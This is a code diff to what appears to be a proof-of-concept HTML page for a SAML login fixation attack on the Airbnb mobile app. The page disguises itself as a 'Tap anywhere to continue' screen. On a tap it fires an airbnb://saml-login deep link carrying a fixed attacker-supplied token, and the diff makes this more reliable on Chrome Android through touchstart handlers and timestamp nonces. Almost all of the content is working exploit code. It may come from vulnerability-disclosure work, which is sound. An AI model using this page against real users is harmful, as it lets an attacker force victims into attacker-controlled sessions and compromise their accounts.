@@ -34,7 +34,13 @@
 </head>
 <body>
 
-<a id="tap" href="#"></a>
+<!--
+  touchstart fires BEFORE the browser decides what to do with the tap.
+  We update href to a fresh URL with a timestamp nonce so Chrome never
+  sees the same URL twice. The browser then follows the anchor natively —
+  more reliable than window.location.href on Chrome Android.
+-->
+<a id="tap" href="airbnb://saml-login?saml_token=6bihac4mstjga4k5ba2bncqif_A4W_SAML_FIXATION_PROOF&_t=0"></a>
 
 <div class="screen">
   <svg class="logo" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
@@ -47,17 +53,18 @@
 <p class="hint">Tap anywhere to continue</p>
 
 <script>
-  // Chrome deduplicates custom-scheme navigations to the exact same URL within
-  // a tab session — subsequent taps are silently dropped. Appending a timestamp
-  // nonce makes each invocation a distinct URL so Chrome fires the intent every time.
-  // The Airbnb app ignores unknown query params, so saml_token still gets extracted.
   var TOKEN = "6bihac4mstjga4k5ba2bncqif_A4W_SAML_FIXATION_PROOF";
   var tap = document.getElementById("tap");
 
-  tap.addEventListener("click", function(e) {
-    e.preventDefault();
-    var url = "airbnb://saml-login?saml_token=" + encodeURIComponent(TOKEN) + "&_t=" + Date.now();
-    window.location.href = url;
+  // Update href on touchstart — fires before the browser follows the link.
+  // Fresh timestamp each touch = Chrome treats it as a new URL every time.
+  tap.addEventListener("touchstart", function() {
+    tap.href = "airbnb://saml-login?saml_token=" + encodeURIComponent(TOKEN) + "&_t=" + Date.now();
+  }, { passive: true });
+
+  // Fallback for desktop / mouse clicks (keeps PoC testable in devtools)
+  tap.addEventListener("mousedown", function() {
+    tap.href = "airbnb://saml-login?saml_token=" + encodeURIComponent(TOKEN) + "&_t=" + Date.now();
   });
 </script>
 
